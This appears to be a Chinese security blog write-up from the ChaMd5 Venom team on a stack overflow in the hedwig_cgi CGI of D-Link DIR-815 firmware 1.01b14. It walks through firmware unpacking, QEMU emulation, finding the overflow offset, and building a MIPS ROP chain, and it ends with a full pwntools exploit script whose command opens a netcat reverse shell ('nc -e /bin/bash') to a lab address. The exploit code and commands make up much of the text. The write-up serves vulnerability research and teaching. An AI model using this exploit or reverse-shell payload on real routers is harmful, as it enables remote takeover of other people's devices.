<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZhNCwVp7HKowmP2SWcr_lw)

  

```
漏洞介绍：
DIR-815 cgibi中hedwig_cgi函数中处理HTTP 头中 Cookie 字段中 uid 的值时存在栈溢出漏洞
版本：DIR-815 FW 1.01b14_1.01b14
```

一、固件解包
------

利用 binwalk 进行固件解包：

```
binwalk -e DIR-815 FW 1.01b14_1.01b14.bin
```

得到文件系统如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhXcqXOexQRLZgLuSSuWn7wKKX9jbl00eT0QS1CibG2UoupKODZbqwlHw/640?wx_fmt=png)

二、漏洞静态分析
--------

漏洞存在于 hedwig_cgi 函数中，当其处理前端的 HTTP 头中 Cookie 字段的 uid 值时，存在栈溢出漏洞。hedwig_cgi 是集成到 cgibin 文件中的，因此直接拖取 cgibin 文件进行分析，定位 hedwig_cgi 函数：  
当程序获取 Cookie 字段中的 uid 值后，直接将内容复制到 v27 所在数组中，造成栈溢出。  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhxEPTqj1iaia4QGx7yXdUR0GhWFW4auZKibNIaUXMjuryyefZuYiamWrjmQ/640?wx_fmt=png)

对应汇编代码如下:  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhR31icXcVgxfRNJgInE5WIvGHaNFUHWqjLGTq7nmcEKjqWuibxcACrGUw/640?wx_fmt=png)

函数返回处汇编代码如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8Uh769Zqg7jJJKNrj6JksbbG26WvUXUbb7p30NNs4qjk2Hx1cVQGgRbAA/640?wx_fmt=png)

三、漏洞动态调试
--------

为了能对程序进行调试，确认溢出偏移量，需要进行仿真，下面分用户仿真和系统仿真两种方法。

### 1. 用户仿真

用户仿真脚本如下：

```
#!/bin/bashtest=$(python -c "print 'uid=' + 'A'*1043 + 'BBBB'")LEN=$(echo -n "$test" | wc -c)PORT="1234"sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
```

在 ubuntu18 虚拟机下，用户仿真用 gdb 调试失败，但是可以利用 ida 进行远程调试  
但是在用户仿真情况下，不能正常执行 shellcode 相关功能，因此还是利用系统仿真。

### 2. 系统仿真

**（1）系统仿真启动**  
首先进行 qemu 虚拟机启动：

```
sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
```

在主机中进行网络配置：

```
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
```

在虚拟机中进行网络配置：

```
ifconfig eth1 192.168.100.2 netmask 255.255.255.0
route add default gw 192.168.100.254
```

主机虚拟机互相 ping 通：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8Uhy9W0Ejib6Khmeflk2ic6iaowUWrMdeibEQY4iazX5mDAEM3L3wicuhVHF8QQ/640?wx_fmt=png)

为了方便调试，关闭地址随机化：  

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

上传路由器文件系统：

```
scp -r squashfs-root/ root@192.168.100.2:~/
```

系统仿真时，需要模拟启动 hedwig.cgi 相关服务，模拟其相关服务时需要配置好 conf 文件：（放在 squash 根目录下）

```
Umask 026PIDFile /var/run/httpd.pidLogGMT On  #开启logErrorLog /log #log文件Tuning{    NumConnections 15    BufSize 12288    InputBufSize 4096    ScriptBufSize 4096    NumHeaders 100    Timeout 60    ScriptTimeout 60}Control{    Types    {        text/html    { html htm }        text/xml    { xml }        text/plain    { txt }        image/gif    { gif }        image/jpeg    { jpg }        text/css    { css }        application/octet-stream { * }    }    Specials    {        Dump        { /dump }        CGI            { cgi }        Imagemap    { map }        Redirect    { url }    }    External    {        /usr/sbin/phpcgi { php }    \}\}Server{    ServerName "Linux, HTTP/1.1, "    ServerId "1234"    Family inet    Interface eth0         #网卡    Address 192.168.100.2  #qemu的ip地址    Port "4321"            #对应web访问端口    Virtual    {        AnyHost        Control        {            Alias /            Location /htdocs/web            IndexNames { index.php }            External            {                /usr/sbin/phpcgi { router_info.xml }                /usr/sbin/phpcgi { post_login.xml }            }        }        Control        {            Alias /HNAP1            Location /htdocs/HNAP1            External            {                /usr/sbin/hnap { hnap }            }            IndexNames { index.hnap }        }    \}\}
```

然后利用如下脚本在 qemu 中启动 httpd 服务：（在根目录下运行）

```
#!/bin/bashcp conf /cp sbin/httpd /cp -rf htdocs/ /rm /etc/servicescp -rf etc/ /cp lib/ld-uClibc-0.9.30.1.so  /lib/cp lib/libcrypt-0.9.30.1.so  /lib/cp lib/libc.so.0  /lib/cp lib/libgcc_s.so.1  /lib/cp lib/ld-uClibc.so.0  /lib/cp lib/libcrypt.so.0  /lib/cp lib/libgcc_s.so  /lib/cp lib/libuClibc-0.9.30.1.so  /lib/cd /ln -s /htdocs/cgibin /htdocs/web/hedwig.cgiln -s /htdocs/cgibin /usr/sbin/phpcgiln -s  /htdocs/cgibin /usr/sbin/hnap./httpd -f conf
```

然后在 ubuntu 中访问 hedwig.cgi 服务：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8Uh1ZB2JowxxicpQDZY7FALOuV6MiaWtUPDkXjkdibnC44eG9Cic2fTjTUicbA/640?wx_fmt=png)

在 qemu 中直接运行 hedwig.cgi 服务，显示 no REQUEST，说明 hedwig.cgi 服务没有收到请求  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhI0dAia0ibicyvtBciaJBRS7PFltuNtcEdIOYJ2UgC9FvmOW5gGXj0UCHTw/640?wx_fmt=png)

因此需要提前配置 REQUEST_METHOD 等方法，这里通过环境变量进行设置：  

```
export CONTENT_LENGTH="100"export CONTENT_TYPE="application/x-www-form-urlencoded"export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"export HTTP_COOKIE="uid=1234"
```

此时再运行 hedwig.cgi 服务即可正常接收内容：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8Uhibe2b95JDLPdHUOOcdsqTibic3v5eMJFv4bKIhs0pTmEN3fBUaapOGichw/640?wx_fmt=png)

**（2）调试确定栈溢出偏移**  
下面利用 gdbserver 对 hedwig.cgi 服务进行调试，调试脚本如下：  

```
#!/bin/bashexport CONTENT_TYPE="application/x-www-form-urlencoded"export HTTP_COOKIE=$(python -c "print 'uid=' + 'A'*1009 + 'BBBB'")#export HTTP_COOKIE="uid=`cat context`"export CONTENT_LENGTH=$(echo -n "$HTTP_COOKIE" | wc -c)export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"echo "uid=4321"|./gdbserver.mipsle 192.168.100.254:8888 /htdocs/web/hedwig.cgi#echo "uid=4321"|/htdocs/web/hedwig.cgi
```

qemu 中运行调试脚本，ubuntu 中进行 gdb 连接：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhZOiamlW8X1bfmCGzx1Fg36t5icpX89R7S8kYayq1uR2R9IIRk6hatLjQ/640?wx_fmt=png)

在 hedwig_cgi 函数的返回地址下断，然后查看此时栈空间：  

```
SP   0x7fff63c8 ◂— 0x0*PC   0x409a38 ◂— lw     $s6, 0x4d8($sp)─────────[ DISASM ]─────────   0x409a28    lw     $ra, 0x4e4($sp)   0x409a2c    move   $v0, $s7   0x409a30    lw     $fp, 0x4e0($sp)   0x409a34    lw     $s7, 0x4dc($sp) ► 0x409a38    lw     $s6, 0x4d8($sp)   0x409a3c    lw     $s5, 0x4d4($sp)   0x409a40    lw     $s4, 0x4d0($sp)   0x409a44    lw     $s3, 0x4cc($sp)   0x409a48    lw     $s2, 0x4c8($sp)   0x409a4c    lw     $s1, 0x4c4($sp)   0x409a50    lw     $s0, 0x4c0($sp)
```

查看此时 sp+0x4e4 地址，成功劫持。因此可以判定偏移量为 1009.

```
pwndbg> x/20xw 0x7fff68ac0x7fff68ac: 0x42424242 0x77fe2100 0x77fe26bc 0x77fe236c0x7fff68bc: 0x7fff68c0 0x77faa4e0 0x00000000 0x000000000x7fff68cc: 0x00000000 0x00000000 0x00000000 0x000000000x7fff68dc: 0x00000000 0x00000003 0x00400034 0x000000040x7fff68ec: 0x00000020 0x00000005 0x00000008 0x00000006
```

**（3）ROP 链构造**  
核心目的就是劫持返回地址，执行 system( ) 函数。为了避免 cache incoherency 机制，我们利用 system 函数来构造 ROP 链进行 shell 的反弹，而不直接布置 shellcode。首先要确定可以调用 system 函数的 libc，利用 vmmap 查看各区段：

```
pwndbg> vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  0x400000   0x41c000 r-xp    1c000 0      /htdocs/cgibin  0x42c000   0x42d000 rw-p     1000 1c000  /htdocs/cgibin  0x42d000   0x430000 rwxp     3000 0      [heap]0x77f34000 0x77f92000 r-xp    5e000 0      /lib/libc.so.00x77f92000 0x77fa1000 ---p     f000 0      0x77fa1000 0x77fa2000 r--p     1000 5d000  /lib/libc.so.00x77fa2000 0x77fa3000 rw-p     1000 5e000  /lib/libc.so.00x77fa3000 0x77fa8000 rw-p     5000 0      0x77fa8000 0x77fd1000 r-xp    29000 0      /lib/libgcc_s.so.10x77fd1000 0x77fe1000 ---p    10000 0      0x77fe1000 0x77fe2000 rw-p     1000 29000  /lib/libgcc_s.so.10x77fe2000 0x77fe7000 r-xp     5000 0      /lib/ld-uClibc.so.00x77ff5000 0x77ff6000 rw-p     1000 0      0x77ff6000 0x77ff7000 r--p     1000 4000   /lib/ld-uClibc.so.00x77ff7000 0x77ff8000 rw-p     1000 5000   /lib/ld-uClibc.so.00x7ff58000 0x7fff7000 rwxp    9f000 0      [stack]0x7fff7000 0x7fff8000 r-xp     1000 0      [vdso]
```

查看 libc.so.0 链接的 libc 文件：

```
ls -l libc.so.0
lrwxrwxrwx 1 root root 21 12月 26 22:03 libc.so.0 -> libuClibc-0.9.30.1.so
```

因此所需要的 system 函数及相关 gadgets 均在 libuClibc-0.9.30.1.so。  
根据 mipsrop 工具查找到的 gadgets，构造 ROP 链：  
这里参考《揭秘家用路由器 0day 漏洞挖掘技术》一书的方法：先将 system 函数的地址 -1 传入某个寄存器中，之后找到对这个寄存器进行加 +1 的操作的 gadget 进行调用即可将 system 地址恢复，因此我们查找 “addiu $s0,1” 指令，选用 gadgets：158c8  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhBnibKj73mgJMZJoh4djG49t2O1SsibuwHbmaTOKuiaIynpTzsXic9OdxmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhwTpZ24qYcHxo0y5LFFalSmv7dNYiaftialyFXhaQJT59oQribyvNfutIw/640?wx_fmt=png)

可知第一个 gadgets 可以将 s0 赋值为 system 函数地址。  
现在我们还需要找到给 system 函数传参的 gadgets。利用 mipsrop.stackfinder，选用 gadgets：159cc。因为其既可以跳转至 system 函数，又可以通过 s5 给 system 函数传参。  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8Uh1IGROHRJu2jicGOnlj2wuLTT7S5Lqa9OpovMpeSLEaGk5jqdDBAuG9g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhicrQz0NkNHMyVcoTKHVrAT5D3icXFLibiasHibMictZXrY0pjhaIvxL0bB6w/640?wx_fmt=png)

因此整体流程为：  

```
劫持地址-->gadget1:0x158c8(给s0赋值为system函数地址,跳转至s5)--->gadgets2:0x159cc(给system函数传参并跳转执行)
```

因此 exp 编写如下：

```
#!/usr/bin/python2from pwn import *context.endian = "little"context.arch = "mips"base_addr = 0x77f34000system_addr_1 = 0x53200-1gadget1 = 0x158c8gadget2 = 0x159cccmd = 'nc -e /bin/bash 192.168.100.254 9999'padding = 'A' * 973padding += p32(base_addr + system_addr_1) # s0padding += 'A' * 4                        # s1padding += 'A' * 4                        # s2padding += 'A' * 4                        # s3padding += 'A' * 4                        # s4padding += p32(base_addr+gadget2)         # s5padding += 'A' * 4                        # s6padding += 'A' * 4                        # s7padding += 'A' * 4                        # fppadding += p32(base_addr + gadget1)       # rapadding += 'B' * 0x10padding += cmdf = open("context",'wb')f.write(padding)f.close()
```

运行 exp 生成 context，将 congtext 上传，然后运行 hedwig.cgi 服务：

```
!/bin/bashexport CONTENT_TYPE="application/x-www-form-urlencoded"#export HTTP_COOKIE=$(python -c "print 'uid=' + 'A'*1009 + 'BBBB'")export HTTP_COOKIE="uid=`cat context`"export CONTENT_LENGTH=$(echo -n "$HTTP_COOKIE" | wc -c)export REQUEST_METHOD="POST"export REQUEST_URI="/hedwig.cgi"#echo "uid=4321"|./gdbserver.mipsle 192.168.100.254:8888 /htdocs/web/hedwig.cgiecho "uid=4321"|/htdocs/web/hedwig.cgi
```

主机端 nc 监听并反弹 shell 如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBT04135JA0opHoupoCoV8UhvTDbxKufVgBQMhUicB1Spfe9t8BVxBoCElcAjl6VTDND3iclvkb1jqkA/640?wx_fmt=png)

以上就是整体的调试流程，当然也可以通过布置 shellcode 来实现 shell 的反弹，但是需要绕过 cache incoherency 机制，利用 sleep 函数进行 flush 操作。  

  

end

  

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组 IOT + 工控 + 样本分析 长期招新  

欢迎联系 admin@chamd5.org

  
  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBR8nk7RR7HefBINILy4PClwoEMzGCJovye9KIsEjCKwxlqcSFsGJSv3OtYIjmKpXzVyfzlqSicWwxQ/640?wx_fmt=jpeg)